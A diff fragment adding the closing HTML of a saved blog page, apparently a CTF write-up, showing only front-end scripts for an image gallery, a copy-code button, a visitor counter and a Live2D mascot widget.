+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/busuanzi-2.3.pure.min.js.下载"></script>
+ 
+<!-- ClickLove -->
+ 
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/clickLove.js.下载"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/clipboard.css">
+ <script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/clipboard.min.js.下载"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/L2Dwidget.min.js.下载"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"log":false});</script>
+
+<div id="live2d-widget" class="live2d-widget-container" style="position: fixed; left: 0px; bottom: -20px; width: 250px; height: 500px; z-index: 99999; opacity: 1; pointer-events: none;"><canvas id="live2dcanvas" width="500" height="1000" style="position: absolute; left: 0px; top: 0px; width: 250px; height: 500px;"></canvas></div></body></html>
